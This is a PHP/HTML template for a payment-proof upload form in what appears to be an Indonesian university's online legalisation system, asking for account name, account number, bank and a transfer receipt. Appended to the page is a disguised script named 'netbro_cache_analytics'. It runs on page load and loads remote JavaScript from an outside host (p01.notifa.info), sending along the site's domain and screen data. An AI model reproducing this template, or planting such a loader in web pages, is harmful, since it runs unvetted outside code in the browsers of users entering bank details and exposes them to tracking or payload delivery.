<!DOCTYPE html>
<html>
<!-- Mirrored from light.pinsupreme.com/emails_payment_due.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 08 Apr 2019 18:15:10 GMT -->

<body style="background-color: #222533; padding: 20px; font-family: font-size: 14px; line-height: 1.43; font-family: &quot;Helvetica Neue&quot;, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0px auto; background-color: #fff; box-shadow: 0px 20px 50px rgba(0,0,0,0.05);">
        <?php foreach ($data as $d) : ?>
            <form method="POST" id="signup-form" class="signup-form" action="<?= base_url('User/bukti_bayar/' . base64_encode($d->ID_Reservasi)); ?>" enctype="multipart/form-data" name="data">
            <?php endforeach; ?>
            <div style="padding: 60px 70px; border-top: 1px solid rgba(0,0,0,0.05);">
                <h1 style="margin-top: 0px;">Pembayaran</h1>
                <div style="color: #636363; font-size: 14px; margin-bottom: 30px">Perhatikan data pembayaran dan nominal pembayaran dengan benar.</div>
                <div style="background-color: #F4F4F4; margin: 20px 0px 40px;">
                    <div style="padding: 20px; text-transform: uppercase; color: #8D929D; font-size: 11px; font-weight: bold; letter-spacing: 1px; text-align: center;">
                        Masukkan bukti pembayaran:
                    </div>
                    <table style="border-collapse: collapse; width: 100%;">
                        <tr>
                            <td style="padding: 20px 20px; color: #111; border: 1px solid #e7e7e7; border-left: none; width: 50%;">
                                <div style="text-transform: uppercase; letter-spacing: 1px; color: #B8B8B8; font-size: 10px; font-weight: bold; margin-bottom: 3px;"><label>Nama (Atas Nama Transfer)</label></div>
                                <div style="font-weight: bold;"><input type="text" name="name" id="name" /></div>

                                <?php foreach ($data as $d) : ?>
                                    <input type="hidden" name="ID_Reservasi" value="<?= $d->ID_Reservasi; ?>" />
                                <?php endforeach; ?>
                            </td>
                            <td style="padding: 20px 20px; color: #111; border: 1px solid #e7e7e7; border-left: none; border-right: none;">
                                <div style="text-transform: uppercase; letter-spacing: 1px; color: #B8B8B8; font-size: 10px; font-weight: bold; margin-bottom: 3px;"><label for="rekening" class="form-label">No. Rekening</label></div>
                                <div style="font-weight: bold; color: #D62525;">
                                    <input type="text" name="rekening" id="rekening" />
                                </div>
                            </td>
                        </tr>
                        <tr>
                            <td style="padding: 20px 40px; color: #111; width: 50%;" colspan="2" align="center">
                                <div style="text-transform: uppercase; letter-spacing: 1px; color: #B8B8B8; font-size: 10px; font-weight: bold; margin-bottom: 3px;"><label class="form-label">Bank</label></div>
                                <div style="font-weight: bold;">
                                    <table>
                                        <tr>
                                            <td align="center" style="padding: 10px 30px;">
                                                <input type="radio" name="bank" value="BCA" /><br>
                                                <img align="center" src="https://3.bp.blogspot.com/-ZK6W9UlA3lw/V15RGexr3yI/AAAAAAAAAJ4/nkyM9ebn_qg3_rQWyBZ1se5L_SSuuxcDACLcB/s1600/Bank_Central_Asia.png" alt="BCA" width="50" height="25"></td>
                                            <td align="center" style="padding: 10px 30px;">
                                                <input type="radio" name="bank" value="BNI" /><br>
                                                <img align="center" src="https://www.bni.co.id/Portals/1/bni-logo-id.svg?ver=2017-04-27-170938-000" alt="BNI" width="60" height="30">
                                            </td>
                                            <td align="center" style="padding: 10px 30px;">
                                                <input type="radio" name="bank" value="Mandiri" /><br>
                                                <img align="center" src="https://www.bankmandiri.co.id/image/layout_set_logo?img_id=31567&t=1564908593501" alt="Mandiri" width="50" height="25">
                                            </td>
                                        </tr>
                                    </table>
                                </div>
                            </td>
                        </tr>
                        <tr>
                            <!-- <td style="padding: 20px 20px; color: #111; border: 1px solid #e7e7e7; border-left: none; width: 50%;">
                                <div style="text-transform: uppercase; letter-spacing: 1px; color: #B8B8B8; font-size: 10px; font-weight: bold; margin-bottom: 3px;"><label for="birth_date" class="form-label">Tanggal Transfer</label>
                                </div>
                                <div style="font-weight: bold;">
                                    <input type="date" name="tanggal" id="tanggal" />
                                </div>
                            </td> -->
                            <td style="padding: 20px 20px; color: #111; border: 1px solid #e7e7e7; border-left: none; border-right: none;">
                                <div style="text-transform: uppercase; letter-spacing: 1px; color: #B8B8B8; font-size: 10px; font-weight: bold; margin-bottom: 3px;"><label for="berkas" class="form-label">Bukti Transfer</label></div>
                                <div style="font-weight: bold; color: #D62525; width: 50px;">
                                    <input type="file" name="berkas" id="berkas" />
                                </div>
                            </td>
                        </tr>
                        <tr>
                            <td style="padding: 20px 10px 20px 40px; color: #111; border-left: 1px solid #e7e7e7; " align="center" colspan="2">
                                <button type="submit" name="submit" id="submit" style="padding: 8px 15px; background-color: #4B72FA; color: #fff; font-weight: bolder; font-size: 14px; display: inline-block; margin-right: 20px; text-decoration: none; white-space: nowrap;">Submit Pembayaran</button>
                            </td>
                        </tr>
                    </table>
                    <div style="color: #B8B8B8; font-size: 12px; padding: 30px; border-top: 1px solid #e7e7e7;">Terimakasih sudah menggunakan sistem legalisir online<br>Salam TU Fasilkom Universitas Mercu Buana. <a href="#">kontak kami</a> untuk informasi lebih lanjut.</div>
                </div>
            </div>
            <div style="background-color: #F5F5F5; padding: 40px; text-align: center;">
                <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(0,0,0,0.05);">
                    <div style="color: #A5A5A5; font-size: 10px;">Copyright 2019 &copy; Aslab Fakultas Ilmu Komputer</div>
                </div>
            </div>
    </div>
    </form>
    </div>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2bdBFSqcIYgo5CxwCK3PClrhfm4zhaOvizKxovOmhPM24l1vxSSPLHjEfeqvwZNWxlkILIhSOMawD08RNxSS5zreuDD6QuXI%2byNwBTei1a1aLHUpBLJ64tasN%2byuwCy5xq8M46zNIbZIJJVGBMkAWxTEeKZYIJI5rWkr%2b0wM1vvcB33BW0lyE6AqBBSMPeckGnW4sXhhHUufnZ%2fqJokHozJQHIUA8aLNWgzdlejaLzcXStUfzmGbk0tbTvZDF4%2bvB4S98PaTQ4xfDDH71YlfBTn1aQRi4oIWVf5Kj3%2bSRngZ3JNR%2fSIOPDXmMRbB2lK7GiqCePf6xG3%2bkqOfrcYanzSXp4S%2bRzpnf6PqLLDx5TOR35YZObjH%2bEfHH%2fgD3Epgo4asdQ5jQpX0jw%2fh0RvNvsMk8%2bh0LFOlJC2Ex29cZymftFxG16zeus%2bh3nL%2bAAYRlhKw9oWvwA9AFGccB1m981Pdt%2f969XCg1FBgbtAUbsg8z5nLVsKsH7A%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>
<!-- Mirrored from light.pinsupreme.com/emails_payment_due.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 08 Apr 2019 18:15:10 GMT -->

</html>